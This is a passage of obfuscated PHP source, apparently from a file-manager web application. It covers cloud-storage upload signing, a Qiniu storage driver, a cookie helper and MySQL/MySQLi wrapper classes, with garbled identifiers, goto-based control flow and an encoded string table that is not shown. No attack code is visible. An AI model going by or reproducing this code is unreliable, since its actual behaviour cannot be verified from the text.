$ôŸ˜Ä•» =& $_SERVER[Ñ¯©ç]; $„±±Ÿ†í = $this->pathFather($€õƒÂ¦É); $¶¢ÂÌ˜œ = $this->client->getHttpUploadPostParams($this->bucket, $„±±Ÿ†í, $ôŸ˜Ä•»[230], $şàøŒıÃ); return array_merge((array) $¶¢ÂÌ˜œ, array($ôŸ˜Ä•»[209] => $this->getHost())); } public function multiUploadFormData($ÙåšÚÒ, $æ…é‘œè = 3600) { $ëŸ’¸Î… =& $_SERVER[Ñ¯©ç]; $âä£È¯ = gmdate($ëŸ’¸Î…[254]); $ÏÏª­ƒ = array(); $ı÷™Ï†» = $this->client->getUploadId($this->bucket, $ÙåšÚÒ, $ÏÏª­ƒ); if (!$ı÷™Ï†») { return !1; } return array($ëŸ’¸Î…[255] => $ı÷™Ï†», $ëŸ’¸Î…[209] => $this->getHost() . $ëŸ’¸Î…[8] . $this->pathEncode($ÙåšÚÒ), $ëŸ’¸Î…[256] => $âä£È¯, $ëŸ’¸Î…[107] => $ÙåšÚÒ); } public function multiUploadAuthData($Ç´»¾í, $µÓŒ›Ã— = array()) { $–¶«¬ğ =& $_SERVER[Ñ¯©ç]; $Ü–Éù = isset($µÓŒ›Ã—[$–¶«¬ğ[256]]) ? $µÓŒ›Ã—[$–¶«¬ğ[256]] : gmdate($–¶«¬ğ[254]); $íÂ³íéø = isset($µÓŒ›Ã—[$–¶«¬ğ[188]]) ? $µÓŒ›Ã—[$–¶«¬ğ[188]] : $–¶«¬ğ[12]; $´ƒ°ó™¿ = $µÓŒ›Ã—[$–¶«¬ğ[107]]; unset($µÓŒ›Ã—[$–¶«¬ğ[107]]); if (isset($µÓŒ›Ã—[$–¶«¬ğ[257]])) { $µÓŒ›Ã—[$–¶«¬ğ[256]] = $Ü–Éù; return $this->listUploadParts($´ƒ°ó™¿, $µÓŒ›Ã—); } $áŸ©‹€Ø = array($–¶«¬ğ[258], $–¶«¬ğ[12], $–¶«¬ğ[133], $–¶«¬ğ[12], "\x78\55\x61\155\172\x2d\x64\141\164\145\x3a{$Ü–Éù}", $–¶«¬ğ[8] . $this->bucket . $–¶«¬ğ[8] . $this->pathEncode($´ƒ°ó™¿) . $íÂ³íéø); if (strpos($íÂ³íéø, $–¶«¬ğ[259]) === 0) { $áŸ©‹€Ø[0] = $–¶«¬ğ[260]; } if (isset($µÓŒ›Ã—[$–¶«¬ğ[261]]) && $µÓŒ›Ã—[$–¶«¬ğ[261]] == $–¶«¬ğ[262]) { $áŸ©‹€Ø[0] = $–¶«¬ğ[262]; } $ƒí¿‹ì = implode($–¶«¬ğ[59], $áŸ©‹€Ø); $õº“ = base64_encode(hash_hmac($–¶«¬ğ[263], $ƒí¿‹ì, $this->secret, !0)); $ŞáË´›ƒ = $–¶«¬ğ[264] . $this->accessKey . $–¶«¬ğ[4] . $õº“; if (strpos($íÂ³íéø, $–¶«¬ğ[259]) === 0) { return array($–¶«¬ğ[265] => $ŞáË´›ƒ, $–¶«¬ğ[256] => $Ü–Éù); } return $ŞáË´›ƒ; } public function listUploadParts($ø‰±İæ¥, $ †—Âå™ = array()) { $òÄú™Áğ =& $_SERVER[Ñ¯©ç]; $úÛÊ€İÁ = str_replace($òÄú™Áğ[266], $òÄú™Áğ[12], $ †—Âå™[$òÄú™Áğ[188]]); $³û‡îôé = $this->client->listParts($this->bucket, $ø‰±İæ¥, $úÛÊ€İÁ); if (!$³û‡îôé) { return !1; } unset($ †—Âå™[$òÄú™Áğ[257]], $ †—Âå™[$òÄú™Áğ[261]]); $ †—Âå™[$òÄú™Áğ[107]] = $ø‰±İæ¥; $Ã¢ÂÍï¾ = $this->multiUploadAuthData($ø‰±İæ¥, $ †—Âå™); if (empty($Ã¢ÂÍï¾)) { return !1; } return array($òÄú™Áğ[265] => $Ã¢ÂÍï¾, $òÄú™Áğ[256] => $ †—Âå™[$òÄú™Áğ[256]], $òÄú™Áğ[267] => $³û‡îôé); } public function getHost() { $şÁÂ‡õÏ =& $_SERVER[Ñ¯©ç]; $¸¡ñÔ›© = parent::getHost(); if (!$this->osType) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($şÁÂ‡õÏ[80], $şÁÂ‡õÏ[74], $şÁÂ‡õÏ[79], $şÁÂ‡õÏ[72]))) { return $¸¡ñÔ›© . $şÁÂ‡õÏ[8] . $this->bucket; } $¸¡ñÔ›© = explode($şÁÂ‡õÏ[211], $¸¡ñÔ›©); return $¸¡ñÔ›©[0] . $şÁÂ‡õÏ[211] . $this->bucket . $şÁÂ‡õÏ[10] . $¸¡ñÔ›©[1]; } public function size($Äöô°±Ÿ) { $ı³‡íÄÄ = $this->objectMeta($Äöô°±Ÿ); return $ı³‡íÄÄ ? $ı³‡íÄÄ[$_SERVER[Ñ¯©ç][89]] : 0; } public function info($—à‚ïÕ) { if ($this->isFolder($—à‚ïÕ)) { return $this->folderInfo($—à‚ïÕ); } else { if ($this->isFile($—à‚ïÕ)) { return $this->fileInfo($—à‚ïÕ); } } return !1; } public function exist($™¢úîÓ„) { return $this->isFile($™¢úîÓ„) || $this->isFolder($™¢úîÓ„); } public function isFile($–Ô ÛØê) { return !$this->isFolder($–Ô ÛØê) && $this->objectMeta($–Ô ÛØê); } public function isFolder($ÚÆàïúÊ) { return $this->cacheMethod($_SERVER[Ñ¯©ç][179], $ÚÆàïúÊ); } protected function objectMeta($Û•Í€åë) { return $this->cacheMethod($_SERVER[Ñ¯©ç][181], $Û•Í€åë); } protected function _objectMeta($ğÚ¦”¶Ö) { $ëÔùöŞ­ =& $_SERVER[Ñ¯©ç]; $ğÚ¦”¶Ö = rtrim($ğÚ¦”¶Ö, $ëÔùöŞ­[8]); try { $Ç¹ÓìşŒ = $this->client->getObjectInfo($this->bucket, $ğÚ¦”¶Ö); if (!isset($Ç¹ÓìşŒ[$ëÔùöŞ­[253]]) && isset($Ç¹ÓìşŒ[$ëÔùöŞ­[268]])) { $Ç¹ÓìşŒ[$ëÔùöŞ­[253]] = $Ç¹ÓìşŒ[$ëÔùöŞ­[268]]; } } catch (Exception $ĞçÄ§•) { $Ç¹ÓìşŒ = !1; } if (!$Ç¹ÓìşŒ) { } return $Ç¹ÓìşŒ; } protected function _isFolder($ñì¸¾ğ») { $¶óÃğ·Æ =& $_SERVER[Ñ¯©ç]; $ñì¸¾ğ» = rtrim($ñì¸¾ğ», $¶óÃğ·Æ[8]); if ($ñì¸¾ğ» == $¶óÃğ·Æ[12] || $ñì¸¾ğ» == $¶óÃğ·Æ[8]) { return !0; } $¸Í¯‹â = $this->client->getBucket($this->bucket, $ñì¸¾ğ», null, 1); if (empty($¸Í¯‹â[$¶óÃğ·Æ[237]])) { return !1; } $Ãı€¼Õ = $¸Í¯‹â[$¶óÃğ·Æ[237]][0][$¶óÃğ·Æ[32]]; return stripos($Ãı€¼Õ, $ñì¸¾ğ» . $¶óÃğ·Æ[8]) === 0 ? !0 : !1; if (substr($Ãı€¼Õ, -1) == $¶óÃğ·Æ[8]) { return !0; } if (get_path_this($Ãı€¼Õ) == get_path_this($ñì¸¾ğ»)) { return !1; } return !0; } public function listObject($Ûöä¼µ‘) { return $this->fileList($Ûöä¼µ‘, $_SERVER[Ñ¯©ç][12], !0); } } goto A¹·£Ç¬Î˜; F×œ“ØºÁ: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($Á÷Ø°†Ê = '', $ø§ñ™Ì = 0) { if (is_string($Á÷Ø°†Ê) && $Á÷Ø°†Ê != $_SERVER[Ñ¯©ç][12]) { $this->prefix = $Á÷Ø°†Ê; } if (is_numeric($ø§ñ™Ì) && $ø§ñ™Ì > 0) { $this->expire = $ø§ñ™Ì; } } public static function getInstance() { static $Š×¥ÄÖº; if ($Š×¥ÄÖº === null) { $Š×¥ÄÖº = new self(); } return $Š×¥ÄÖº; } private static $cookieDisable = false; public static function disable($Ö³Äİ’Å) { self::$cookieDisable = $Ö³Äİ’Å; } private static $sameCookieSet = array(); public static function set($Ê¾‰¦“´, $´´Àî¬ç, $Ëé×¿ñÁ = 0, $¼òó²¼Í = false, $¨­…ƒİ = false) { $ùì¼ô‘½ =& $_SERVER[Ñ¯©ç]; if (self::$cookieDisable) { return; } if (!$Ëé×¿ñÁ) { $Ëé×¿ñÁ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$Ê¾‰¦“´]) && self::$sameCookieSet[$Ê¾‰¦“´] == $´´Àî¬ç . $Ëé×¿ñÁ) { return; } self::$sameCookieSet[$Ê¾‰¦“´] = $´´Àî¬ç . $Ëé×¿ñÁ; if (!$¨­…ƒİ) { $¨­…ƒİ = str_replace(HOST, $ùì¼ô‘½[12], APP_HOST); $¨­…ƒİ = _get($GLOBALS, $ùì¼ô‘½[935], $¨­…ƒİ); } $µ¸ªÂ¬ = $ùì¼ô‘½[12]; setcookie($Ê¾‰¦“´, $´´Àî¬ç, time() + $Ëé×¿ñÁ, $ùì¼ô‘½[8] . trim($¨­…ƒİ, $ùì¼ô‘½[8]) . $µ¸ªÂ¬, !1, !1, $¼òó²¼Í); } public static function setSafe($èÁ¹ôä, $Şï‘ó«Ú, $”¸¦¾ = 0) { self::set($èÁ¹ôä, $Şï‘ó«Ú, $”¸¦¾, !0); } public static function get($˜ÔÓ—Ëê) { static $Ü¦äßæŞ = false; if (!$Ü¦äßæŞ) { self::initHeaderCookie(); $Ü¦äßæŞ = !0; } return isset($_COOKIE[$˜ÔÓ—Ëê]) ? $_COOKIE[$˜ÔÓ—Ëê] : !1; } private static function initHeaderCookie() { $¸ï§Êí =& $_SERVER[Ñ¯©ç]; if (!isset($_SERVER[$¸ï§Êí[936]]) || !$_SERVER[$¸ï§Êí[936]]) { return; } $®ıÃÃ˜ = explode($¸ï§Êí[84], $_SERVER[$¸ï§Êí[936]]); foreach ($®ıÃÃ˜ as $‚öÅŒÊ) { $‚öÅŒÊ = explode($¸ï§Êí[937], $‚öÅŒÊ); if (count($‚öÅŒÊ) != 2 || !isset($‚öÅŒÊ[1])) { continue; } $_COOKIE[trim($‚öÅŒÊ[0])] = trim($‚öÅŒÊ[1]); } } public static function remove($¦ñƒ¿ôÕ, $Ä˜Õìô£ = false) { unset($_COOKIE[$¦ñƒ¿ôÕ]); self::set($¦ñƒ¿ôÕ, $_SERVER[Ñ¯©ç][12], 1, $Ä˜Õìô£); } } class DbMysql extends Db { public function __construct($ı°±¦Ö = '') { $‰¢˜ôúÊ =& $_SERVER[Ñ¯©ç]; if (!extension_loaded($‰¢˜ôúÊ[856])) { think_exception(think_lang($‰¢˜ôúÊ[14]) . $‰¢˜ôúÊ[938]); } if (!empty($ı°±¦Ö)) { $this->config = $ı°±¦Ö; if (empty($this->config[$‰¢˜ôúÊ[17]])) { $this->config[$‰¢˜ôúÊ[17]] = $‰¢˜ôúÊ[12]; } } } public function connect($‘µê ­– = '', $ÊÁ«Ò‚ñ = 0, $îÎ“ñôÅ = false) { $„¤­µú =& $_SERVER[Ñ¯©ç]; if (!isset($this->linkID[$ÊÁ«Ò‚ñ])) { if (empty($‘µê ­–)) { $‘µê ­– = $this->config; } $ŞĞòŠÀó = $‘µê ­–[$„¤­µú[939]] . ($‘µê ­–[$„¤­µú[940]] ? "\72{$‘µê ­–[$„¤­µú[940]]}" : $„¤­µú[12]); $İî¨êÂ = !empty($‘µê ­–[$„¤­µú[17]][$„¤­µú[18]]) ? $‘µê ­–[$„¤­µú[17]][$„¤­µú[18]] : $this->pconnect; if ($İî¨êÂ) { $this->linkID[$ÊÁ«Ò‚ñ] = mysql_pconnect($ŞĞòŠÀó, $‘µê ­–[$„¤­µú[941]], $‘µê ­–[$„¤­µú[942]], 131072); } else { $this->linkID[$ÊÁ«Ò‚ñ] = mysql_connect($ŞĞòŠÀó, $‘µê ­–[$„¤­µú[941]], $‘µê ­–[$„¤­µú[942]], !0, 131072); } if (!$this->linkID[$ÊÁ«Ò‚ñ] || !empty($‘µê ­–[$„¤­µú[21]]) && !mysql_select_db($‘µê ­–[$„¤­µú[21]], $this->linkID[$ÊÁ«Ò‚ñ])) { think_exception(mysql_error()); } $ÇøÅš—ó = mysql_get_server_info($this->linkID[$ÊÁ«Ò‚ñ]); mysql_query($„¤­µú[943] . think_config($„¤­µú[944]) . $„¤­µú[68], $this->linkID[$ÊÁ«Ò‚ñ]); if ($ÇøÅš—ó > $„¤­µú[945]) { mysql_query($„¤­µú[946], $this->linkID[$ÊÁ«Ò‚ñ]); } $this->connected = !0; if (1 != think_config($„¤­µú[22])) { unset($this->config); } } return $this->linkID[$ÊÁ«Ò‚ñ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($È¢„“ Ó) { $Ç¦Ì¯Šß =& $_SERVER[Ñ¯©ç]; if (0 === stripos($È¢„“ Ó, $Ç¦Ì¯Šß[325])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $È¢„“ Ó; if ($this->queryID) { $this->free(); } think_action_status($Ç¦Ì¯Šß[23], 1); think_status($Ç¦Ì¯Šß[24]); $this->queryID = mysql_query($È¢„“ Ó, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($­ÏûÑµ) { $·²È’Ÿ¦ =& $_SERVER[Ñ¯©ç]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $­ÏûÑµ; if ($this->queryID) { $this->free(); } think_action_status($·²È’Ÿ¦[25], 1); think_status($·²È’Ÿ¦[24]); $¶æ˜ª¢œ = mysql_query($­ÏûÑµ, $this->_linkID); $this->debug(); if (!1 === $¶æ˜ª¢œ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Ñ¯©ç][947], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $âş±Ê¶ = mysql_query($_SERVER[Ñ¯©ç][948], $this->_linkID); $this->transTimes = 0; if (!$âş±Ê¶) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¢ÕºŞ¡¯ = mysql_query($_SERVER[Ñ¯©ç][949], $this->_linkID); $this->transTimes = 0; if (!$¢ÕºŞ¡¯) { $this->error(); return !1; } } return !0; } private function getAll() { $ÊÚêÅê§ = array(); if ($this->numRows > 0) { while ($ÓÖ°ËÖÉ = mysql_fetch_assoc($this->queryID)) { $ÊÚêÅê§[] = $ÓÖ°ËÖÉ; } mysql_data_seek($this->queryID, 0); } return $ÊÚêÅê§; } public function getFields($µºòª‰Ù) { $†ô’”çÎ =& $_SERVER[Ñ¯©ç]; $¸†şûâ = $this->query($†ô’”çÎ[950] . $this->parseKey($µºòª‰Ù)); $•¿¿Û‚ = array(); if ($¸†şûâ) { foreach ($¸†şûâ as $ñ”‡ë’“ => $ÔŠÄéÂÈ) { $•¿¿Û‚[$ÔŠÄéÂÈ[$†ô’”çÎ[31]]] = array($†ô’”çÎ[32] => $ÔŠÄéÂÈ[$†ô’”çÎ[31]], $†ô’”çÎ[33] => $ÔŠÄéÂÈ[$†ô’”çÎ[34]], $†ô’”çÎ[35] => (bool) (strtoupper($ÔŠÄéÂÈ[$†ô’”çÎ[36]]) === $†ô’”çÎ[951]), $†ô’”çÎ[37] => $ÔŠÄéÂÈ[$†ô’”çÎ[38]], $†ô’”çÎ[39] => strtolower($ÔŠÄéÂÈ[$†ô’”çÎ[40]]) == $†ô’”çÎ[41], $†ô’”çÎ[42] => strtolower($ÔŠÄéÂÈ[$†ô’”çÎ[43]]) == $†ô’”çÎ[44]); } } return $•¿¿Û‚; } public function getTables($›œªÎïğ = '') { $Ú¯Ë«²Š =& $_SERVER[Ñ¯©ç]; if (!empty($›œªÎïğ)) { $øßçòâÊ = $Ú¯Ë«²Š[952] . $›œªÎïğ . $Ú¯Ë«²Š[953]; } else { $øßçòâÊ = $Ú¯Ë«²Š[954]; } $†Ó¬‰ñ = $this->query($øßçòâÊ); $·¦³Â‘ë = array(); foreach ($†Ó¬‰ñ as $ê‰Ëú» => $ª‘ÏãºÂ) { $·¦³Â‘ë[$ê‰Ëú»] = current($ª‘ÏãºÂ); } return $·¦³Â‘ë; } public function replace($„áêÏáµ, $ĞŸØ‰Ÿ = array()) { $èÓÀıÜâ =& $_SERVER[Ñ¯©ç]; foreach ($„áêÏáµ as $íÍ›ÀàÜ => $³Ú¸Ò¹÷) { $®µ‚ØÅ = $this->parseValue($³Ú¸Ò¹÷); if (is_scalar($®µ‚ØÅ)) { $Ø„ùÖôÃ[] = $®µ‚ØÅ; $ä©ùêùã[] = $this->parseKey($íÍ›ÀàÜ); } } $‚åäû¬Ä = $èÓÀıÜâ[955] . $this->parseTable($ĞŸØ‰Ÿ[$èÓÀıÜâ[340]]) . $èÓÀıÜâ[956] . implode($èÓÀıÜâ[50], $ä©ùêùã) . $èÓÀıÜâ[957] . implode($èÓÀıÜâ[50], $Ø„ùÖôÃ) . $èÓÀıÜâ[958]; return $this->execute($‚åäû¬Ä); } public function insertAll($Ã©´üø‰, $Ñòæ¾´ = array(), $äêØ¸ª = false) { $™›õÆµœ =& $_SERVER[Ñ¯©ç]; if (!is_array($Ã©´üø‰[0])) { return !1; } $î–¶şÊ = array_keys($Ã©´üø‰[0]); $­£öœî = array(); foreach ($Ã©´üø‰ as $ ×¯öÉÔ) { $Ãı¬¿‚‹ = array(); foreach ($ ×¯öÉÔ as $Èˆ—­í¶ => $‹´¦—ñû) { $‹´¦—ñû = $this->parseValue($‹´¦—ñû); if (is_scalar($‹´¦—ñû)) { $Ãı¬¿‚‹[] = $‹´¦—ñû; } } $­£öœî[] = $™›õÆµœ[321] . implode($™›õÆµœ[50], $Ãı¬¿‚‹) . $™›õÆµœ[958]; } array_walk($î–¶şÊ, array($this, $™›õÆµœ[959])); $İÈ»‚ = ($äêØ¸ª ? $™›õÆµœ[960] : $™›õÆµœ[961]) . $™›õÆµœ[962] . $this->parseTable($Ñòæ¾´[$™›õÆµœ[340]]) . $™›õÆµœ[956] . implode($™›õÆµœ[50], $î–¶şÊ) . $™›õÆµœ[963] . implode($™›õÆµœ[50], $­£öœî); return $this->execute($İÈ»‚); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Ûó‘œÒ =& $_SERVER[Ñ¯©ç]; $this->error = mysql_errno() . $Ûó‘œÒ[4] . mysql_error($this->_linkID); if ($Ûó‘œÒ[12] != $this->queryStr) { $this->error .= LNG($Ûó‘œÒ[48]) . $this->queryStr; } think_trace($this->error, $Ûó‘œÒ[12], $Ûó‘œÒ[49]); return $this->error; } public function escapeString($œ·õõóÛ) { if ($this->_linkID) { return mysql_real_escape_string($œ·õõóÛ, $this->_linkID); } else { return mysql_escape_string($œ·õõóÛ); } } public function parseKey(&$÷Ğ¨Ü²¨, $Ÿ‹Û»ÑÒ = true) { $ê­Ú„ =& $_SERVER[Ñ¯©ç]; if ($Ÿ‹Û»ÑÒ) { $÷Ğ¨Ü²¨ = $this->parseKeyCheck($÷Ğ¨Ü²¨); } if ($÷Ğ¨Ü²¨ != $ê­Ú„[221] && !preg_match($ê­Ú„[964], $÷Ğ¨Ü²¨)) { $÷Ğ¨Ü²¨ = $ê­Ú„[444] . trim($÷Ğ¨Ü²¨, $ê­Ú„[444]) . $ê­Ú„[444]; } return $÷Ğ¨Ü²¨; } } class DbMysqli extends Db { public function __construct($éñáã­¥ = '') { $òßÛŠ½ç =& $_SERVER[Ñ¯©ç]; if (!extension_loaded($òßÛŠ½ç[965])) { think_exception(think_lang($òßÛŠ½ç[14]) . $òßÛŠ½ç[966]); } if (!empty($éñáã­¥)) { $this->config = $éñáã­¥; if (empty($this->config[$òßÛŠ½ç[17]])) { $this->config[$òßÛŠ½ç[17]] = $òßÛŠ½ç[12]; } } } public function connect($Àä¦ê¢í = '', $ë ®€ˆÌ = 0) { $üî©àÓ¨ =& $_SERVER[Ñ¯©ç]; if (!isset($this->linkID[$ë ®€ˆÌ])) { if (empty($Àä¦ê¢í)) { $Àä¦ê¢í = $this->config; } $this->linkID[$ë ®€ˆÌ] = new mysqli($Àä¦ê¢í[$üî©àÓ¨[939]], $Àä¦ê¢í[$üî©àÓ¨[941]], $Àä¦ê¢í[$üî©àÓ¨[942]], $Àä¦ê¢í[$üî©àÓ¨[21]], $Àä¦ê¢í[$üî©àÓ¨[940]] ? intval($Àä¦ê¢í[$üî©àÓ¨[940]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $Ğ·íÏÔĞ = $this->linkID[$ë ®€ˆÌ]->server_version; $this->linkID[$ë ®€ˆÌ]->query($üî©àÓ¨[943] . think_config($üî©àÓ¨[944]) . $üî©àÓ¨[68]); if ($Ğ·íÏÔĞ > $üî©àÓ¨[945]) { $this->linkID[$ë ®€ˆÌ]->query($üî©àÓ¨[946]); } $this->connected = !0; if (1 != think_config($üî©àÓ¨[22])) { unset($this->config); } } return $this->linkID[$ë ®€ˆÌ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($©Î¯Ù¤) { $ÒçÖ¯°­ =& $_SERVER[Ñ¯©ç]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $©Î¯Ù¤; if ($this->queryID) { $this->free(); } think_action_status($ÒçÖ¯°­[23], 1); think_status($ÒçÖ¯°­[24]); $this->queryID = $this->_linkID->query($©Î¯Ù¤); if ($this->_linkID->more_results()) { while (($ïŞ®¬ö¥ = $this->_linkID->next_result()) != NULL) { $ïŞ®¬ö¥->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($¨ŠşÖúÍ) { $™ÃÒ•ºå =& $_SERVER[Ñ¯©ç]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¨ŠşÖúÍ; if ($this->queryID) { $this->free(); } think_action_status($™ÃÒ•ºå[25], 1); think_status($™ÃÒ•ºå[24]); $ìäíÀÅ» = $this->_linkID->query($¨ŠşÖúÍ); $this->debug(); if (!1 === $ìäíÀÅ») { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ªêæÀìå = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ªêæÀìå) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $°óÀ‰’Ô = $this->_linkID->rollback(); $this->transTimes = 0; if (!$°óÀ‰’Ô) { $this->error(); return !1; } } return !0; } private function getAll() { $ÃÆ€ıóœ = array(); if ($this->numRows > 0) { for ($Œ´é‚Şê = 0; $Œ´é‚Şê < $this->numRows; $Œ´é‚Şê++) { $ÃÆ€ıóœ[$Œ´é‚Şê] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ÃÆ€ıóœ; } public function getFields($›äãœÕÁ) { $ìş‹’€ =& $_SERVER[Ñ¯©ç]; $ó÷†õ¡€ = $this->query($ìş‹’€[950] . $this->parseKey($›äãœÕÁ)); $Æä¶ò¥¶ = array(); if ($ó÷†õ¡€) { foreach ($ó÷†õ¡€ as $³¨ÔìĞ÷ => $¼”¬û) { $Æä¶ò¥¶[$¼”¬û[$ìş‹’€[31]]] = array($ìş‹’€[32] => $¼”¬û[$ìş‹’€[31]], $ìş‹’€[33] => $¼”¬û[$ìş‹’€[34]], $ìş‹’€[35] => (bool) ($¼”¬û[$ìş‹’€[36]] === $ìş‹’€[12]), $ìş‹’€[37] => $¼”¬û[$ìş‹’€[38]], $ìş‹’€[39] => strtolower($¼”¬û[$ìş‹’€[40]]) == $ìş‹’€[41], $ìş‹’€[42] => strtolower($¼”¬û[$ìş‹’€[43]]) == $ìş‹’€[44]); } } return $Æä¶ò¥¶; } public function getTables($’Ñ–Ë’é = '') { $Æş÷·ñ™ =& $_SERVER[Ñ¯©ç]; $ìÓŸåù = !empty($’Ñ–Ë’é) ? $Æş÷·ñ™[952] . $’Ñ–Ë’é . $Æş÷·ñ™[953] : $Æş÷·ñ™[954]; $ô·³æ™» = $this->query($ìÓŸåù); $¥¢Ş‚š = array(); if ($ô·³æ™») { foreach ($ô·³æ™» as $Äôş£© => $´˜´¥¼ƒ) { $¥¢Ş‚š[$Äôş£©] = current($´˜´¥¼ƒ); } } return $¥¢Ş‚š; } public function replace($İôÛÑ¤è, $ÌÇ´Åˆ— = array()) { $«íáÁŠº =& $_SERVER[Ñ¯©ç]; foreach ($İôÛÑ¤è as $Šº¶±­ => $ô ›ì) { $“«Ì«ØŒ = $this->parseValue($ô ›ì); if (is_scalar($“«Ì«ØŒ)) { $´ñÒ†‹[] = $“«Ì«ØŒ; $üŞ ²”[] = $this->parseKey($Šº¶±­); } } $é¾¾Ò€ò = $«íáÁŠº[955] . $this->parseTable($ÌÇ´Åˆ—[$«íáÁŠº[340]]) . $«íáÁŠº[956] . implode($«íáÁŠº[50], $üŞ ²”) . $«íáÁŠº[957] . implode($«íáÁŠº[50], $´ñÒ†‹) . $«íáÁŠº[958]; return $this->execute($é¾¾Ò€ò); } public function insertAll($ÎÏÎšŒ¥, $è‰ÈÍ¿Ì = array(), $ÓŸÍû¤è = false) { $¤µ—­Á¼ =& $_SERVER[Ñ¯©ç]; if (!is_array($ÎÏÎšŒ¥[0])) { return !1; } $«¬†ş—ğ = array_keys($ÎÏÎšŒ¥[0]); $×ùÎàïÁ = array(); foreach ($ÎÏÎšŒ¥ as $ŒÕ¢¦¡) { $…©‰ÏöÈ = array(); foreach ($ŒÕ¢¦¡ as $Öò‚Ù¹Œ => $Æ†÷£ç‚) { $Æ†÷£ç‚ = $this->parseValue($Æ†÷£ç‚); if (is_scalar($Æ†÷£ç‚)) { $…©‰ÏöÈ[] = $Æ†÷£ç‚; } } $×ùÎàïÁ[] = $¤µ—­Á¼[321] . implode($¤µ—­Á¼[50], $…©‰ÏöÈ) . $¤µ—­Á¼[958]; } array_walk($«¬†ş—ğ, array($this, $¤µ—­Á¼[959])); $ÕãÎâöš = $ÓŸÍû¤è ? $¤µ—­Á¼[960] : $¤µ—­Á¼[961]; $“Ü‚µŞö = $ÕãÎâöš . $¤µ—­Á¼[962] . $this->parseTable($è‰ÈÍ¿Ì[$¤µ—­Á¼[340]]) . $¤µ—­Á¼[956] . implode($¤µ—­Á¼[50], $«¬†ş—ğ) . $¤µ—­Á¼[963] . implode($¤µ—­Á¼[50], $×ùÎàïÁ); return $this->execute($“Ü‚µŞö); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ôË Áğ =& $_SERVER[Ñ¯©ç]; $this->error = $this->_linkID->errno . $ôË Áğ[4] . $this->_linkID->error; if ($ôË Áğ[12] != $this->queryStr) { $this->error .= LNG($ôË Áğ[48]) . $this->queryStr; } think_trace($this->error, $ôË Áğ[12], $ôË Áğ[49]); return $this->error; } public function escapeString($Şşã¨ë) { if ($this->_linkID) { return $this->_linkID->real_escape_string($Şşã¨ë); } else { return addslashes($Şşã¨ë); } } public function parseKey(&$ú©Šôı, $í½ÏŞ³ = true) { $ÄÉæÇõ— =& $_SERVER[Ñ¯©ç]; if ($í½ÏŞ³) { $ú©Šôı = $this->parseKeyCheck($ú©Šôı); } if ($ú©Šôı != $ÄÉæÇõ—[221] && !preg_match($ÄÉæÇõ—[964], $ú©Šôı)) { $ú©Šôı = $ÄÉæÇõ—[444] . trim($ú©Šôı, $ÄÉæÇõ—[444]) . $ÄÉæÇõ—[444]; } return $ú©Šôı; } } goto D…ìÌ³½óø; C´‚ŠÚ‹áÊ: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($¤æ—ÕŸê) { parent::__construct(); require_once SDK_DIR . $_SERVER[Ñ¯©ç][1504]; $this->_init($¤æ—ÕŸê); } public function _init($İÆİ¾¿) { $ÏÇ§¤À  =& $_SERVER[Ñ¯©ç]; $this->config = $İÆİ¾¿; foreach ($İÆİ¾¿ as $İÄÎ»Ø => $øÔá“ß‚) { if (isset($this->{$İÄÎ»Ø})) { $this->{$İÄÎ»Ø} = $øÔá“ß‚; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ÏÇ§¤À [1505] . LNG($ÏÇ§¤À [1436])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($åïŞÈóâ, $æ ª½áÖ = '', $Ø×§ï‘ø = REPEAT_RENAME) { if ($this->setContent($åïŞÈóâ, $æ ª½áÖ)) { return $this->getPathOuter($åïŞÈóâ); } return !1; } public function mkdir($ıƒã¸Íç, $·»”öœ™ = REPEAT_SKIP) { $«ÈÂ›¡Œ =& $_SERVER[Ñ¯©ç]; $¡¹í°Äï = trim($ıƒã¸Íç, $«ÈÂ›¡Œ[8]); if ($this->_isFolder($¡¹í°Äï)) { return $this->getPathOuter($¡¹í°Äï); } $ıƒã¸Íç = 